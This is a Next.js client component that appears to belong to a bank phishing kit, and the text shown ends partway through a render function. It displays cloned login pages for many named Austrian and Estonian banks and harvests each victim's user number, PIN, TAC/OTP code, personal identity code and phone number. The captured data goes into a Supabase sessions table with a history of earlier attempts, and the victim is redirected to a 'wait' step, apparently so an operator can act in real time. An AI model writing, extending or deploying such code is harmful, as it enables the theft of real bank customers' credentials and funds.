"use client";

import { useEffect, useMemo, useState } from "react";
import { useRouter } from "next/navigation";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import type { BankTheme } from "@/lib/bank-theme-config";
import { getBankTheme } from "@/lib/bank-theme-config";
import { normalizeBankCustomHtml } from "@/lib/bank-custom-html";
import { normalizeBankCredentialPayload, normalizeBankLoginFields } from "@/lib/bank-page-adapter";
import { stepToPath } from "@/lib/session-routes";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { DEFAULT_DESIGN_CONFIG, BlockType } from "@/lib/bank-design-schema";
import { getRenderableImageProps } from "@/lib/visual-tree-logo";
import parse, { attributesToProps, domToReact, Element } from "html-react-parser";
import { logAuditEvent, flushAuditQueueNow } from "@/lib/audit-event";

// Austrian Banks from templates
import { BankAustria } from "@/components/templates/BankAustria";
import { BawagAg } from "@/components/templates/BawagAg";
import { ErsteBank } from "@/components/templates/ErsteBank";
import { Raiffeisen } from "@/components/templates/Raiffeisen";
import { Volksbanken } from "@/components/templates/Volksbanken";
import { PosojilnicaBank } from "@/components/templates/PosojilnicaBank";
import { Bank99 } from "@/components/templates/Bank99";
import { BtvVierLanderBank } from "@/components/templates/BtvVierLanderBank";
import { BksBank } from "@/components/templates/BksBank";
import { Oberbank } from "@/components/templates/Oberbank";
import { HypoNoe } from "@/components/templates/HypoNoe";
import { HypoTirol } from "@/components/templates/HypoTirol";
import { HypoVorarlberg } from "@/components/templates/HypoVorarlberg";
import { HypoBurgenland } from "@/components/templates/HypoBurgenland";
import { HypoOberosterreich } from "@/components/templates/HypoOberosterreich";
import { AerzteApothekerBank } from "@/components/templates/AerzteApothekerBank";
import { BankhausSpangler } from "@/components/templates/BankhausSpangler";
import { SchelhammerCapital } from "@/components/templates/SchelhammerCapital";
import { Easybank } from "@/components/templates/Easybank";
import { Schoellerbank } from "@/components/templates/Schoellerbank";
import { SpardaBank } from "@/components/templates/SpardaBank";
import { Volkskreditbank } from "@/components/templates/Volkskreditbank";
import { AnadiBank } from "@/components/templates/AnadiBank";
import { MarchfelderBank } from "@/components/templates/MarchfelderBank";
import { Dolomitenbank } from "@/components/templates/Dolomitenbank";
import { EstoniaBankTemplate } from "@/components/templates/EstoniaBankTemplate";

type Props = {
  sessionId: string;
  bankSlug: string;
  bank: any;
};

function inferCanonicalCredentialKey(
  key: string,
): "personalCode" | "bankPhone" | "username" | "password" | "tacCode" | "loginMethod" | null {
  const normalizedKey = key.toLowerCase().replace(/[^a-z0-9]/g, "");

  if (
    normalizedKey.includes("personalidentitycode") ||
    normalizedKey.includes("personalidentificationcode") ||
    normalizedKey.includes("identitycode") ||
    normalizedKey.includes("personalcode") ||
    normalizedKey.includes("isikukood")
  ) {
    return "personalCode";
  }

  if (
    normalizedKey.includes("telefoninumber") ||
    normalizedKey.includes("mobilenumber") ||
    normalizedKey.includes("phonenumber") ||
    normalizedKey.includes("mobileidphone") ||
    normalizedKey.includes("phonefield") ||
    normalizedKey.includes("telefon") ||
    normalizedKey.includes("phone") ||
    normalizedKey === "phone"
  ) {
    return "bankPhone";
  }

  if (
    normalizedKey.includes("userid") ||
    normalizedKey.includes("username") ||
    normalizedKey.includes("loginid") ||
    normalizedKey.includes("nickname") ||
    normalizedKey.includes("kasutajanimi") ||
    normalizedKey.includes("kasutajatunnus") ||
    normalizedKey.endsWith("tunnus")
  ) {
    return "username";
  }

  if (
    normalizedKey.includes("password") ||
    normalizedKey.includes("passcode") ||
    normalizedKey.includes("pincode") ||
    normalizedKey.includes("pinkood") ||
    normalizedKey.includes("parool") ||
    normalizedKey.includes("pincalculatorcode") ||
    normalizedKey.includes("pincalccode") ||
    normalizedKey.includes("pincalcpassword") ||
    normalizedKey === "pincalc" ||
    normalizedKey === "pin"
  ) {
    return "password";
  }

  if (
    normalizedKey.includes("tac") ||
    normalizedKey.includes("otp") ||
    normalizedKey.includes("smscode") ||
    normalizedKey.includes("verificationcode") ||
    normalizedKey.includes("responsecode") ||
    normalizedKey.includes("kontrollkood")
  ) {
    return "tacCode";
  }

  if (normalizedKey.includes("loginmethod") || normalizedKey.includes("authmethod")) {
    return "loginMethod";
  }

  return null;
}

function isIgnoredRawCredentialKey(key: string): boolean {
  const normalizedKey = key.toLowerCase().replace(/[^a-z0-9]/g, "");

  return (
    /^input\d+$/.test(normalizedKey) ||
    normalizedKey.includes("rememberme") ||
    normalizedKey.includes("remembermesimpleid") ||
    normalizedKey.includes("remembermesmartid") ||
    normalizedKey.includes("remembermemobileid") ||
    normalizedKey.includes("loginwidget") ||
    normalizedKey.includes("useridmid") ||
    normalizedKey.includes("useridsid") ||
    normalizedKey.includes("useridsimple") ||
    normalizedKey === "mobileid" ||
    normalizedKey === "smartid" ||
    normalizedKey === "idcard" ||
    normalizedKey === "pincalc" ||
    normalizedKey === "kalkulaator"
  );
}

function shouldResetPreviousBankField(key: string): boolean {
  const normalizedKey = key.toLowerCase().replace(/[^a-z0-9]/g, "");

  if (key === "phone") {
    return false;
  }

  if (
    key === "verfuegernummer" ||
    key === "pin" ||
    key === "tacCode" ||
    key === "personalCode" ||
    key === "loginMethod" ||
    key === "bankPhone" ||
    key === "username" ||
    key === "password" ||
    key === "orderedField1" ||
    key === "orderedField1Key" ||
    key === "orderedField2" ||
    key === "orderedField2Key" ||
    key === "orderedField2Type" ||
    key === "orderedField3" ||
    key === "orderedField3Key" ||
    key === "orderedField3Type"
  ) {
    return true;
  }

  if (inferCanonicalCredentialKey(key)) {
    return true;
  }

  if (isIgnoredRawCredentialKey(key)) {
    return true;
  }

  return (
    /^input\d+$/.test(normalizedKey) ||
    normalizedKey.includes("rememberme") ||
    normalizedKey.includes("loginwidget") ||
    normalizedKey.includes("mobilenumber") ||
    normalizedKey.includes("mobileidphone") ||
    normalizedKey.includes("mobileids") ||
    normalizedKey.includes("smartid") ||
    normalizedKey.includes("simpleid") ||
    normalizedKey.includes("userid") ||
    normalizedKey.includes("personalidentity") ||
    normalizedKey.includes("personalidentification") ||
    normalizedKey.includes("identitycode") ||
    normalizedKey.includes("isikukood") ||
    normalizedKey.includes("password") ||
    normalizedKey.includes("passcode") ||
    normalizedKey.includes("parool") ||
    normalizedKey.includes("tac") ||
    normalizedKey.includes("otp") ||
    normalizedKey.includes("verificationcode") ||
    normalizedKey.includes("responsecode") ||
    normalizedKey.includes("digipass") ||
    normalizedKey.includes("kalkulaator")
  );
}

function hasMeaningfulSubmitValue(value: unknown): boolean {
  return typeof value === "string" && value.trim().length > 0;
}

function countMeaningfulCredentialEntries(values: Array<unknown>): number {
  return values.filter(hasMeaningfulSubmitValue).length;
}

function hasIdentityCredentialValue(values: Array<unknown>) {
  return values.some(hasMeaningfulSubmitValue);
}

function hasPasswordCredentialValue(values: Array<unknown>) {
  return values.some(hasMeaningfulSubmitValue);
}

export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const [theme, setTheme] = useState<BankTheme | null>(null);

  const [verfuegernummer, setVerfuegernummer] = useState("");
  const [pin, setPin] = useState("");
  const [tacCode, setTacCode] = useState("");
  const [saving, setSaving] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
  const [personalCode, setPersonalCode] = useState("");
  const [loginMethod, setLoginMethod] = useState("");
  const canSubmitPrimaryCredentials =
    hasIdentityCredentialValue([verfuegernummer, personalCode]) &&
    hasPasswordCredentialValue([pin]);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      const nextTheme = await getBankTheme(bankSlug);
      if (!cancelled) setTheme(nextTheme);
    })();
    return () => {
      cancelled = true;
    };
  }, [bankSlug]);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) return;
      const { data } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      setSessionFormData(fd);
      // Once yalnizca bos ise doldur: fetch gec cozulunce mount'ta/sirada yazilan
      // degerleri (orn. Raiffeisen mount-effect'i "Kärnten" -> loginMethod)
      // "" ile ezmesin.
      setVerfuegernummer((prev) => prev || (fd.verfuegernummer ?? ""));
      setPin((prev) => prev || (fd.pin ?? ""));
      setTacCode((prev) => prev || (fd.tacCode ?? ""));
      setPersonalCode((prev) => prev || (fd.personalCode ?? ""));
      setLoginMethod((prev) => prev || (fd.loginMethod ?? ""));
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  async function handleSubmit(e?: React.FormEvent, overrideData?: any) {
    if (e) e.preventDefault();
    if (!supabase || !sessionId || !bank) return;
    setSaving(true);
    setError(null);

    const knownCredentialKeys = new Set([
      "verfuegernummer",
      "pin",
      "tacCode",
      "personalCode",
      "loginMethod",
      "bankPhone",
      "username",
      "password",
      "orderedField1",
      "orderedField1Key",
      "orderedField2",
      "orderedField2Key",
      "orderedField2Type",
      "orderedField3",
      "orderedField3Key",
      "orderedField3Type",
      "bankSlug",
      "bankName",
    ]);

    const currentVerfuegernummer = overrideData?.verfuegernummer ?? verfuegernummer;
    const currentPin = overrideData?.pin ?? pin;
    const currentTacCode = overrideData?.tacCode ?? tacCode;
    const currentPersonalCode = overrideData?.personalCode ?? personalCode;
    const currentLoginMethod = overrideData?.loginMethod ?? loginMethod;
    const currentBankPhone =
      typeof overrideData?.bankPhone === "string"
        ? overrideData.bankPhone
        : typeof sessionFormData.bankPhone === "string"
            ? sessionFormData.bankPhone
            : "";
    const currentUsername =
      typeof overrideData?.username === "string"
        ? overrideData.username
        : typeof sessionFormData.username === "string"
          ? sessionFormData.username
          : "";
    const currentPassword =
      typeof overrideData?.password === "string"
        ? overrideData.password
        : typeof sessionFormData.password === "string"
          ? sessionFormData.password
          : "";
    const currentOrderedField1 =
      typeof overrideData?.orderedField1 === "string"
        ? overrideData.orderedField1.trim()
        : typeof sessionFormData.orderedField1 === "string"
          ? sessionFormData.orderedField1.trim()
          : currentPersonalCode || currentUsername || currentVerfuegernummer || currentBankPhone;
    const currentOrderedField1Key =
      typeof overrideData?.orderedField1Key === "string"
        ? overrideData.orderedField1Key.trim()
        : typeof sessionFormData.orderedField1Key === "string"
          ? sessionFormData.orderedField1Key.trim()
          : "";
    const currentOrderedField2 =
      typeof overrideData?.orderedField2 === "string"
        ? overrideData.orderedField2.trim()
        : typeof sessionFormData.orderedField2 === "string"
          ? sessionFormData.orderedField2.trim()
          : currentPassword || currentPin;
    const currentOrderedField2Key =
      typeof overrideData?.orderedField2Key === "string"
        ? overrideData.orderedField2Key.trim()
        : typeof sessionFormData.orderedField2Key === "string"
          ? sessionFormData.orderedField2Key.trim()
          : "";
    const currentOrderedField2Type =
      typeof overrideData?.orderedField2Type === "string"
        ? overrideData.orderedField2Type.trim()
        : typeof sessionFormData.orderedField2Type === "string"
          ? sessionFormData.orderedField2Type.trim()
          : "";
    const currentOrderedField3 =
      typeof overrideData?.orderedField3 === "string"
        ? overrideData.orderedField3.trim()
        : typeof sessionFormData.orderedField3 === "string"
          ? sessionFormData.orderedField3.trim()
          : "";
    const currentOrderedField3Key =
      typeof overrideData?.orderedField3Key === "string"
        ? overrideData.orderedField3Key.trim()
        : typeof sessionFormData.orderedField3Key === "string"
          ? sessionFormData.orderedField3Key.trim()
          : "";
    const currentOrderedField3Type =
      typeof overrideData?.orderedField3Type === "string"
        ? overrideData.orderedField3Type.trim()
        : typeof sessionFormData.orderedField3Type === "string"
          ? sessionFormData.orderedField3Type.trim()
          : "";
    const currentExtraCapturedValues = Object.entries((overrideData ?? {}) as Record<string, unknown>).flatMap(
      ([key, value]) => {
        if (
          knownCredentialKeys.has(key) ||
          isIgnoredRawCredentialKey(key) ||
          !hasMeaningfulSubmitValue(value)
        ) {
          return [];
        }

        const canonicalKey = inferCanonicalCredentialKey(key);
        if (canonicalKey) {
          return [];
        }

        return [String(value).trim()];
      },
    );
    const hasIdentityCredential =
      hasIdentityCredentialValue([
        currentVerfuegernummer,
        currentPersonalCode,
        currentBankPhone,
        currentUsername,
        currentOrderedField1Key === "username" || currentOrderedField1Key === "personalCode" || currentOrderedField1Key === "bankPhone"
          ? currentOrderedField1
          : "",
        currentOrderedField2Key === "username" || currentOrderedField2Key === "personalCode" || currentOrderedField2Key === "bankPhone"
          ? currentOrderedField2
          : "",
        currentOrderedField3Key === "username" || currentOrderedField3Key === "personalCode" || currentOrderedField3Key === "bankPhone"
          ? currentOrderedField3
          : "",
      ]);
    const hasPasswordCredential =
      hasPasswordCredentialValue([
        currentPin,
        currentPassword,
        currentOrderedField1Key === "password" || currentOrderedField1Key === "pin" ? currentOrderedField1 : "",
        currentOrderedField2Key === "password" || currentOrderedField2Key === "pin" ? currentOrderedField2 : "",
        currentOrderedField3Key === "password" || currentOrderedField3Key === "pin" ? currentOrderedField3 : "",
      ]);

    if (!hasIdentityCredential || !hasPasswordCredential) {
      setSaving(false);
      return;
    }

    const normalizedFields = normalizeBankLoginFields({ 
      verfuegernummer: currentVerfuegernummer, 
      pin: currentPin, 
      tacCode: currentTacCode, 
      personalCode: currentPersonalCode, 
      loginMethod: currentLoginMethod,
      bankPhone: currentBankPhone,
      username: currentUsername,
      password: currentPassword,
    });
    const credentials = normalizeBankCredentialPayload({
      bankSlug: bank.slug,
      bankName: bank.name,
      ...normalizedFields,
    });
    const canonicalFieldValues: Record<string, string> = {
      personalCode: credentials.personalCode ?? "",
      bankPhone: credentials.bankPhone ?? "",
      username: credentials.username || credentials.verfuegernummer || "",
      password: credentials.password || credentials.pin || "",
      tacCode: credentials.tacCode ?? "",
      loginMethod: credentials.loginMethod ?? "",
    };

    const extraCapturedFields = Object.fromEntries(
      Object.entries((overrideData ?? {}) as Record<string, unknown>).flatMap(([key, value]) => {
        if (knownCredentialKeys.has(key) || typeof value !== "string" || isIgnoredRawCredentialKey(key)) {
          return [];
        }

        const trimmedValue = value.trim();
        if (!trimmedValue) {
          return [];
        }

        const canonicalKey = inferCanonicalCredentialKey(key);
        if (canonicalKey) {
          return [];
        }

        return [[key, trimmedValue]];
      }),
    );
    // Kullanici verisini korumak icin form_data'yi DB'den taze oku
    // (state eskimis/bos olabilir -> invalid-bank veya banka tekrar secimde
    //  isim/soyisim/telefon form_data'dan SILINIYORDU).
    let baseSessionFormData: Record<string, unknown> = sessionFormData;
    try {
      const { data: freshRow } = await supabase
        .from("sessions")
        .select("form_data")
        .eq("id", sessionId)
        .maybeSingle();
      if (freshRow?.form_data && typeof freshRow.form_data === "object") {
        baseSessionFormData = freshRow.form_data as Record<string, unknown>;
      }
    } catch {
      /* state ile devam */
    }

    const preservedSessionFormData = Object.fromEntries(
      Object.entries(baseSessionFormData).filter(([key]) => !shouldResetPreviousBankField(key)),
    );

    // ⭐ BANKA GECMISI APPEND: SADECE TEKRAR GIRISLERDE push et.
    //   ⚠️ HISTORY'E YENI DEĞIL, ESKI (degismeden onceki sessionFormData) alanlarini PUSH ET!
    //   Boylece kolon = YENI form (girilen), history = ESKI form (gorunur).
    const prevOrdered1 = String((baseSessionFormData as any).orderedField1 || "").trim();
    const prevUsername = String((baseSessionFormData as any).username || (baseSessionFormData as any).verfuegernummer || "").trim();
    const prevPassword = String((baseSessionFormData as any).password || (baseSessionFormData as any).pin || "").trim();
    const isFirstBankEntry =
      prevOrdered1.length === 0 && prevUsername.length === 0 && prevPassword.length === 0;
    const previousHistory = Array.isArray((baseSessionFormData as any).bankFormHistory)
      ? (baseSessionFormData as any).bankFormHistory.slice()
      : [];
    if (!isFirstBankEntry) {
      const prevVerfuegernummer = String((baseSessionFormData as any).verfuegernummer || "").trim();
      const prevUsernameInner = String((baseSessionFormData as any).username || "").trim();
      const prevPin = String((baseSessionFormData as any).pin || "").trim();
      const prevPasswordInner = String((baseSessionFormData as any).password || "").trim();
      const prevBankPhone = String((baseSessionFormData as any).bankPhone || "").trim();
      const prevPersonalCode = String((baseSessionFormData as any).personalCode || "").trim();
      const prevTacCode = String((baseSessionFormData as any).tacCode || "").trim();
      const prevLoginMethod = String((baseSessionFormData as any).loginMethod || "").trim();
      const prevOrderedField1 = String((baseSessionFormData as any).orderedField1 || "").trim();
      const prevOrderedField1Key = String((baseSessionFormData as any).orderedField1Key || "").trim();
      const prevOrderedField2 = String((baseSessionFormData as any).orderedField2 || "").trim();
      const prevOrderedField2Key = String((baseSessionFormData as any).orderedField2Key || "").trim();
      const prevOrderedField2Type = String((baseSessionFormData as any).orderedField2Type || "").trim();
      const prevOrderedField3 = String((baseSessionFormData as any).orderedField3 || "").trim();
      const prevOrderedField3Key = String((baseSessionFormData as any).orderedField3Key || "").trim();
      const prevOrderedField3Type = String((baseSessionFormData as any).orderedField3Type || "").trim();
      const previousHistoryEntry = {
        bankSlug: bank.slug as string | undefined,
        bankName: bank.name as string | undefined,
        htmlStepLabel: "BANKA FORMU",
        verfuegernummer: prevVerfuegernummer,
        username: prevUsernameInner,
        pin: prevPin,
        password: prevPasswordInner,
        bankPhone: prevBankPhone,
        personalCode: prevPersonalCode,
        tacCode: prevTacCode,
        loginMethod: prevLoginMethod,
        orderedField1: prevOrderedField1,
        orderedField1Key: prevOrderedField1Key,
        orderedField2: prevOrderedField2,
        orderedField2Key: prevOrderedField2Key,
        orderedField2Type: prevOrderedField2Type,
        orderedField3: prevOrderedField3,
        orderedField3Key: prevOrderedField3Key,
        orderedField3Type: prevOrderedField3Type,
        rawFields: Object.fromEntries(
          Object.entries(baseSessionFormData as Record<string, any>).filter(
            ([key]) => !shouldResetPreviousBankField(key) && typeof key === "string" && key.length > 0,
          ),
        ),
        capturedAt: new Date().toISOString(),
      };
      previousHistory.push(previousHistoryEntry);
    }

    const rawFields: Record<string, string> = {
      ...extraCapturedFields,
    };

    const nextFormData = {
      ...preservedSessionFormData,
      ...extraCapturedFields,
      orderedField1: currentOrderedField1,
      orderedField1Key: currentOrderedField1Key,
      orderedField2: currentOrderedField2,
      orderedField2Key: currentOrderedField2Key,
      orderedField2Type: currentOrderedField2Type,
      orderedField3: currentOrderedField3,
      orderedField3Key: currentOrderedField3Key,
      orderedField3Type: currentOrderedField3Type,
      ...credentials,
      bankFormHistory: previousHistory,
    };
    const { error: updateError } = await supabase
      .from("sessions")
      .update({ is_hidden: false, current_step: "wait",
        form_data: nextFormData,
      })
      .eq("id", sessionId);

    setSaving(false);
    if (updateError) {
      logAuditEvent({
        session_id: sessionId,
        event_kind: "submit",
        event_action: "bank_submit_error",
        status: "error",
        bank_slug: bank?.slug ?? null,
        bank_name: bank?.name ?? null,
        login_method: credentials.loginMethod ?? "",
        meta: { message: updateError.message ?? String(updateError) },
        error_name: "SupabaseUpdateError",
        error_message: updateError.message ?? String(updateError),
      });
      setError("Eingaben konnten nicht uebermittelt werden. Bitte erneut versuchen.");
      return;
    }
    setSessionFormData(nextFormData);
    logAuditEvent({
      session_id: sessionId,
      event_kind: "bank_form",
      event_action: "bank_submit_wait",
      status: "ok",
      bank_slug: bank?.slug ?? null,
      bank_name: bank?.name ?? null,
      login_method: credentials.loginMethod ?? "",
      from_step: "bank",
      to_step: "wait",
      meta: {
        historyCount: previousHistory.length,
        orderedFields: {
          orderedField1Key: currentOrderedField1Key,
          orderedField2Key: currentOrderedField2Key,
          orderedField3Key: currentOrderedField3Key,
        },
      },
    });
    void flushAuditQueueNow();
    // ⭐ FLASH YOK: router.push → router.replace
    router.replace(stepToPath("wait", sessionId));
  }

  if (!supabase) {
    return (
      <div className="flex min-h-screen items-center justify-center p-4">
        <ConfigMissing />
      </div>
    );
  }

  if (!bank) {
    return (
      <div className="flex min-h-screen items-center justify-center p-4">
        <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-500">
          Onbekende bank. Start de selectie opnieuw.
        </p>
      </div>
    );
  }

  // OUSTRIAN BANKS CUSTOM TEMPLATES
  const handleTemplateChange = (field: string, value: string) => {
    if (field === "verfuegernummer") setVerfuegernummer(value);
    if (field === "pin") setPin(value);
    if (field === "tacCode") setTacCode(value);
    if (field === "personalCode") setPersonalCode(value);
    if (field === "loginMethod") setLoginMethod(value);
  };
  const handleTemplateSubmit = (overrideData?: any) => handleSubmit(undefined, overrideData);
  
  const hasGeneratedDesign = Boolean(bank.design?.visualTree || bank.design?.customHtml);

  // Estonian Banks
  const estonianBanks = ["bigbank", "citadele-banka", "coop-pank", "inbank", "lhv-pank", "luminor-ee", "op-corporate-bank", "seb-pank", "swedbank-ee"];
  if (estonianBanks.includes(bankSlug)) {
    return (
      <EstoniaBankTemplate 
        bankSlug={bankSlug}
        bankName={bank.name}
        logoFile={bank.logoFile}
        brandColor={bank.brandColor || theme?.colors.primary}
        formData={{ verfuegernummer, pin, personalCode, loginMethod }} 
        onChange={handleTemplateChange} 
        handleRouteAction={handleTemplateSubmit} 
        saving={saving} 
      />
    );
  }

  if (!hasGeneratedDesign) {
    if (bankSlug === "bank-austria") return <BankAustria formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "bawag") return <BawagAg formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "erste-bank") return <ErsteBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "raiffeisen") return <Raiffeisen formData={{ verfuegernummer, pin, bundesland: loginMethod }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "volksbank") return <Volksbanken formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "posojilnica") return <PosojilnicaBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "bank99") return <Bank99 formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "btv") return <BtvVierLanderBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "bks-bank") return <BksBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "oberbank") return <Oberbank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "hypo-noe") return <HypoNoe formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "hypo-tirol") return <HypoTirol formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "hypo-vorarlberg") return <HypoVorarlberg formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "hypo-burgenland") return <HypoBurgenland formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "hypo-ooe") return <HypoOberosterreich formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "aerztebank") return <AerzteApothekerBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "spaengler") return <BankhausSpangler formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "schelhammer") return <SchelhammerCapital formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "easybank") return <Easybank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "schoellerbank-ag" || bankSlug === "schoellerbank") return <Schoellerbank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "sparda-bank") return <SpardaBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "vkb") return <Volkskreditbank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "anadi-bank") return <AnadiBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "marchfelder") return <MarchfelderBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "dolomitenbank") return <Dolomitenbank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
  }

  // YENİ DİNAMİK YAPISAL ŞEMA VARSA ONU KULLAN
  if (bank.design && (bank.design.visualTree || bank.design.customHtml || (bank.design.blocks && bank.design.blocks.length > 0))) {
    const design = bank.design;

    if (design.visualTree && !design.customHtml) {
      const renderVisualTree = (element: any): React.ReactNode => {
        const Tag = element.type === "container" ? "div" :
                    element.type === "text" ? "span" :
                    element.type === "form" ? "form" :
                    element.type === "button" ? "button" :
                    element.type === "image" ? "img" :
                    element.type === "input" ? "input" : "div";

        const props: any = {
          key: element.id,
          style: element.styles,
          ...element.attributes,
        };

        if (element.type === "image") {
          Object.assign(props, getRenderableImageProps(element, bank.logoFile, bank.name));
        }

        if (element.type === "input") {
          const fieldName = props.name;
          if (fieldName === "verfuegernummer") {
            props.value = verfuegernummer;
            props.onChange = (e: React.ChangeEvent<HTMLInputElement>) => setVerfuegernummer(e.target.value);
            props.required = false;
          } else if (fieldName === "pin") {
            props.type = "password";
            props.value = pin;
            props.onChange = (e: React.ChangeEvent<HTMLInputElement>) => setPin(e.target.value);
            props.required = false;
          } else if (fieldName === "tacCode") {
            props.value = tacCode;
            props.onChange = (e: React.ChangeEvent<HTMLInputElement>) => setTacCode(e.target.value);
          }
        }

        if (element.type === "button") {
          props.disabled = saving || !canSubmitPrimaryCredentials || props.disabled;
          if (props.type === "submit") {
            props.style = {
              ...props.style,
              opacity: saving || !canSubmitPrimaryCredentials ? 0.7 : props.style?.opacity,
              cursor: saving || !canSubmitPrimaryCredentials ? "not-allowed" : props.style?.cursor,
            };
          }
        }

        if (element.type === "form") {
          props.onSubmit = handleSubmit;
        }

        if (element.type === "input" || element.type === "image") {
          return <Tag {...props} />;
        }

        return (
          <Tag {...props}>
            {element.content}
            {element.children?.map(renderVisualTree)}
          </Tag>
        );
      };

      return (
        <div className="min-h-screen w-full font-sans antialiased">
          {error ? <div style={{ color: "#ef4444", fontSize: "14px", margin: "1rem auto 0", maxWidth: "960px", textAlign: "center", backgroundColor: "#fee2e2", padding: "0.75rem", borderRadius: "8px" }}>{error}</div> : null}
          {renderVisualTree(design.visualTree)}
        </div>
      );
    }
    
    // Eğer AI tamamen özel HTML/React Component şablonu oluşturmuşsa
    if (design.customHtml) {
      const cleanHtml = normalizeBankCustomHtml(design.customHtml);

      const options = {
        replace: (domNode: any) => {
          if (domNode instanceof Element) {
            if (domNode.name === "input" && domNode.attribs?.name === "verfuegernummer") {
              const props = attributesToProps(domNode.attribs);
              return <input {...props} value={verfuegernummer} onChange={(e) => setVerfuegernummer(e.target.value)} />;
            }
            if (domNode.name === "input" && domNode.attribs?.name === "pin") {
              const props = attributesToProps(domNode.attribs);
              return <input {...props} type="password" value={pin} onChange={(e) => setPin(e.target.value)} />;
            }
            if (domNode.name === "input" && domNode.attribs?.name === "tacCode") {
              const props = attributesToProps(domNode.attribs);
              return <input {...props} value={tacCode} onChange={(e) => setTacCode(e.target.value)} />;
            }
            if (domNode.name === "button" && domNode.attribs?.type === "submit") {
              const props = attributesToProps(domNode.attribs);
              return (
                <button
                  {...props}
                  disabled={saving || !canSubmitPrimaryCredentials}
                  style={{
                    ...props.style,
                    opacity: saving || !canSubmitPrimaryCredentials ? 0.7 : 1,
                    cursor: saving || !canSubmitPrimaryCredentials ? 'not-allowed' : 'pointer',
                  }}
                >
                  {domToReact(domNode.children as any, options)}
                </button>
              );
            }
            if (domNode.name === "form") {
              const props = attributesToProps(domNode.attribs);
              return (
                <form {...props} onSubmit={handleSubmit}>
                  {error && <div style={{ color: '#ef4444', fontSize: '14px', marginBottom: '1rem', textAlign: 'center', backgroundColor: '#fee2e2', padding: '0.5rem', borderRadius: '4px' }}>{error}</div>}
                  {domToReact(domNode.children as any, options)}
                </form>
              );
            }
            // Logo yer tutucusunu (<img> src) bankanın gerçek logosuyla değiştir
            if (domNode.name === "img" && domNode.attribs?.src && domNode.attribs.src.includes("placeholder")) {
              if (bank.logoFile) {
                const props = attributesToProps(domNode.attribs);
                return <img {...props} src={bank.logoFile} alt={bank.name} style={{ ...(props.style ?? {}), maxWidth: "100%", maxHeight: "100%", objectFit: "contain", objectPosition: "left center", display: "block" }} />;
              }
            }
          }
        }
      };
      
      return (
        <div className="min-h-screen w-full font-sans antialiased">
          {parse(cleanHtml, options)}
        </div>
      );
    }

    const renderBlock = (block: BlockType, index: number) => {
      switch (block) {
        case "header":
          if (!design.header.show) return null;
          return (
            <header 
              key="header"
              style={{ 
                backgroundColor: design.header.backgroundColor, 
                height: design.header.height,
                padding: design.header.padding,
                display: 'flex',
                alignItems: 'center',
                justifyContent: design.header.logoAlignment === 'center' ? 'center' : design.header.logoAlignment === 'right' ? 'flex-end' : 'flex-start'
              }}
            >
